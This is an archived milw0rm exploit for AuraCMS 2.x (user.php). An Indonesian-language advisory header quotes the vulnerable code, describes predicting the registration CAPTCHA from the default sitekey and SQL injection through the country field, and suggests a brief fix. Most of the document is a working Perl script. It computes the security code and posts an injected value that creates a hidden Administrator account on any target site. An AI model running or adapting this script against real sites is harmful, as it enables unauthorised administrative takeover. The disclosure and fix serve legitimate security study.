<html><head><title>AuraCMS 2.x (user.php) Security Code Bypass / Add Administrator Exploit</title></head><pre>#!/usr/bin/perl
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# AuraCMS 2.x (user.php) - Security Code Bypass &amp; Add Administrator Exploit
# Waktu			:  Feb 28 2008 08:00PM
# Software		:  AuraCMS   
# Versi			:  2.0
#			   2.1
#			   2.2.1
# Vendor 		:  http://www.auracms.org/
#
# ------------------------------------
# Audit Oleh 		:  NTOS-Team
# Lokasi		:  Indonesia | http://newhack.org
# Penjelasan		:
# 
# Kutu pada berkas &quot;user.php&quot; direktori &quot;/content&quot;
#---//---
# 59. if (!$nama || preg_match(&quot;/[^a-zA-Z0-9_-]/&quot;, $nama)) $error .= &quot;Karakter Username tidak diizinkan kecuali a-z,A-Z,0-9,-, dan _&lt;br /&gt;&quot;;
# 60. if (strlen($nama) &gt; 10) $error .= &quot;Username Terlalu Panjang Maksimal 10 Karakter&lt;br /&gt;&quot;;
# 61. if (strrpos($nama, &quot; &quot;) &gt; 0) $error .= &quot;Username Tidak Boleh Menggunakan Spasi&quot;;
# 62. if ($koneksi_db-&gt;sql_numrows($koneksi_db-&gt;sql_query(&quot;SELECT user FROM useraura WHERE user='$nama'&quot;)) &gt; 0) $error .= &quot;Error: Username &quot;.$nama.&quot; sudah terdaftar , silahkan ulangi.&lt;br /&gt;&quot;;
# 63. if ($koneksi_db-&gt;sql_numrows($koneksi_db-&gt;sql_query(&quot;SELECT user FROM temp_useraura WHERE user='$nama'&quot;)) &gt; 0) $error .= &quot;Error: Username &quot;.$nama.&quot; sudah terdaftar , silahkan ulangi.&lt;br /&gt;&quot;;
# 64. if ($koneksi_db-&gt;sql_numrows($koneksi_db-&gt;sql_query(&quot;SELECT email FROM useraura WHERE email='$email'&quot;)) &gt; 0) $error .= &quot;Error: Email &quot;.$email.&quot; sudah terdaftar , silahkan ulangi.&lt;br /&gt;&quot;;
# 65. if ($koneksi_db-&gt;sql_numrows($koneksi_db-&gt;sql_query(&quot;SELECT email FROM temp_useraura WHERE email='$email'&quot;)) &gt; 0) $error .= &quot;Error: Email &quot;.$email.&quot; sudah terdaftar , silahkan ulangi.&lt;br /&gt;&quot;;
# 66. if (!nama)  $error .= &quot;Error: Formulir Nama belum diisi , silahkan ulangi.&lt;br /&gt;&quot;;
# 67. if ($cekperaturan != &quot;1&quot;) $error .= &quot;You should be agree with rules and conditions of use!&lt;br /&gt;&quot;;
# 68. if (!nama)  $error .= &quot;Error: Formulir Nama belum diisi , silahkan ulangi.&lt;br /&gt;&quot;;
# 69. if (!password)  $error .= &quot;Error: Formulir Password belum diisi , silahkan ulangi.&lt;br /&gt;&quot;;
# 70. if ($password != $rpassword)  $error .= &quot;Password and Retype Password Not Macth.&lt;br /&gt;&quot;;
# 71. if (!country)  $error .= &quot;Error: Formulir Negara belum diisi , silahkan ulangi.&lt;br /&gt;&quot;;
# 72. checkemail($email);
# 73. $code = substr(hexdec(md5(&quot;&quot;.date(&quot;F j&quot;).&quot;&quot;.$_POST['random_num'].&quot;&quot;.$sitekey.&quot;&quot;)), 2, 6);
# 74. if (extension_loaded(&quot;gd&quot;) AND $code != $_POST['gfx_check']) $error .= &quot;Error: Security Code Invalid&lt;br /&gt;&quot;;
# 75.
# 76.
# 77. if ($error){
# 78.        $tengah .='&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; class=&quot;middle&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;table width=&quot;100%&quot; class=&quot;bodyline&quot;&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;img src=&quot;images/warning.gif&quot; border=&quot;0&quot;&gt;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&lt;font class=&quot;option&quot;&gt;'.$error.'&lt;/font&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;img src=&quot;images/warning.gif&quot; border=&quot;0&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
# 79. }else{
# 80.        $hasil1 = $koneksi_db-&gt;sql_query(&quot;INSERT INTO useraura (user, email, password , level, tipe, negara)VALUES('$nama', '$email', '$password','User','aktif', '$country')&quot; );
# ---//---
# =&gt; Security Code Bypass
# baris 73 - 74 kode yang menarik,kita coba belah perlahan 2 baris ini
# $sitekey sudah terdifinisi di dalam berkas &quot;config.php&quot; direktori &quot;includes&quot;
# $_POST['random_num'] nilai acak yang dikirim melalui Form isian registrasi User secara hiden [bukan hasil isian User]
# $_POST['gfx_check'] nilai yang dikirim oleh USER melalui Form isian register User mengenai Security Code
# dan selengkap nya dapat di baca pada http://ezine.echo.or.id/ezine18/e18.005.txt
#
# =&gt; Add Administrator [INSERT Metode]
# baik... kita sudah bisa membypass sekuriti kode, sekarang buat admin baru di site target :p
# baris 71. variabel &quot;country&quot; jika tidak diisi hasil nya $error, namun sayang hanya sebatas itu saja aturannya :(
# kita lihat pada baris 80. VALUES('$nama', '$email', '$password','User','aktif', '$country') kembali disini tidak ada penyaringan 
# apa yang kamu pikirkan... mmm... menarik... nakal... jahat... tapi INDAH bukan... ;)
# ya... bagaimana kalo kami berpikir seperti ini ;
# 
# VALUES('$nama', '$email', '$password','User','aktif', 'Indonesia['),('Attacker', 'attacker@hack.ed', 'MD5_Pass', 'Administrator', 'aktif', 'Undergr0und]')&quot; );
#
# baru ini namanya p0rn0c0d3...,
# satu sesi register 2 user yang di buat, pertama user yang sesuai isian form, yang kedua adalah User dengan Administrator hasil keNAKALan User :D
# terima kasih untuk author http://www.milw0rm.com/papers/149
#
# =&gt; Perbaikan Sederhana
# 1. Security Code
#    Ganti dengan Captcha yang berdasarkan session, dan cari Captcha yang tidak mudah dibaca OCR
# 2. Add Administrator
#    Ganti Kode baris 71. pada berkas &quot;user.php&quot; dengan ;
# ---//---
# 71. if (!$country || preg_match(&quot;/[^a-zA-Z]/&quot;, $country))   $error .= &quot;Error: Formulir Negara belum diisi , silahkan ulangi.&lt;br /&gt;&quot;;
# ---//---
#
# =&gt; Perhatian!
# &quot;Exploit ini dibuat untuk pembelajaran, pengetesan dan pembuktian dari apa yang kami pelajari&quot;
# Segala penyalahgunaan dan kerusakan yang diakibat dari exploit ini bukan tanggung jawab kami
# 
# =&gt;Newhack Technology, OpenSource &amp; Security
# ~ NTOS-Team-&gt;[fl3xu5,opt1lc] ~   
#
use Digest::MD5 qw(md5_hex);
use LWP::UserAgent;
use Getopt::Long;
no warnings;

if(!$ARGV[1]) {
 print &quot;\n  |--------------------------------------------------|&quot;;
 print &quot;\n  |          Indonesian Newhack Technology           |&quot;;
 print &quot;\n  |--------------------------------------------------|&quot;;
 print &quot;\n  |   AuraCMS &lt;= 2.2.1  (user.php)                   |&quot;;
 print &quot;\n  |   1.Security Code Bypass                         |&quot;;
 print &quot;\n  |   2.Add Administrator                            |&quot;;
 print &quot;\n  |                Coded by NTOS-Team                |&quot;;
 print &quot;\n  |--------------------------------------------------|&quot;;
 print &quot;\n  | exploit berhasil jika magic_quotes_gpc = off&quot;;
 print &quot;\n[!] Penggunaan : &quot;;
 print &quot;\n[&gt;] perl auracms-user.pl [Site] [Path] &quot;;
 print &quot;\n &quot;;
 print &quot;\n[!] Contoh     : &quot;;
 print &quot;\n[&gt;] perl auracms-user.pl localhost /auracms2x/&quot;;
 print &quot;\n &quot;;
 print &quot;\n&quot;;
 exit;
} 
$host		= $ARGV[0];
$path		= $ARGV[1];
$injek		= &quot;Indonesia'),('t4mugel4p', 'gelap\@banget.gitu', '213aa1379cce2862538be1c046319684','Administrator','aktif', 'DuniaGelap&quot;;
@namabulan 	= qw(January February March April May June July August September October November December);
$sitekey 	= &quot;x1a1MhphAur4kea7V3Rs820dweOwxIw4n3UgSusyM4nt04&quot;; #defaul sitekey dari config.php
$tgl 		= (localtime)[3];
$bln 		= (localtime)[4];
$bulan 		= $namabulan[$bln];
$date 		= &quot;$bulan $tgl&quot;;

## Breaking Security Code Auracms 2.x
$browser	= LWP::UserAgent-&gt;new() or die();
$getgfx 	= $browser -&gt; get(&quot;http://&quot;.$host.$path.&quot;?pilih=user&amp;aksi=register&quot;,);
$get 		= $getgfx -&gt; content;
	if ($get =~ /random_num&quot; value=&quot;(.*?)&quot;&gt;&lt;\/td&gt;/)	{ 
	$randnum = $1; 
	}
$gfx = substr(hex(md5_hex($date.$randnum.$sitekey)), 2, 6);

## Proses Add Administrator
$browser	= LWP::UserAgent-&gt;new() or die();
$postingkomen = $browser -&gt; post(
&quot;http://&quot;.$host.$path.&quot;?pilih=user&amp;aksi=register&quot;,
	[
	  &quot;nama&quot;=&gt;&quot;t1pu4n&quot;,
	  &quot;email&quot;=&gt;&quot;k3tipu\@nie.yea&quot;,
	  &quot;password&quot;=&gt;&quot;terimakasih&quot;,
	  &quot;rpassword&quot;=&gt;&quot;terimakasih&quot;,
	  &quot;country&quot;=&gt;$injek,
	  &quot;gfx_check&quot;=&gt;$gfx,
	  &quot;random_num&quot;=&gt;$randnum,
	  &quot;cekperaturan&quot;=&gt;&quot;1&quot;,
	  &quot;submit&quot;=&gt;&quot;Submit&quot;,
	],
);
	$komen = $postingkomen -&gt; content;
	if ($komen =~ /&gt;Please Login With Your Username and Your Password&lt;/) {
	print &quot;[+]Sukses Register User\n&quot;; 
	print &quot;[+]Silahkan dicoba login\n&quot;;
	print &quot;[+]Username : t4mugel4p\n&quot;;
	print &quot;[+]Password : t4mugel4p\n&quot;;
	exit();}
	if ($komen =~ /&gt;Error/) {
	print &quot;[!]Terjadi Kesalahan Pada Proses Register\n&quot;; 
	exit();}
	print $komen;
	print &quot;[!]\n Exploit Gagal!!! ;)\n&quot;;

# milw0rm.com [2008-03-28]</pre></html>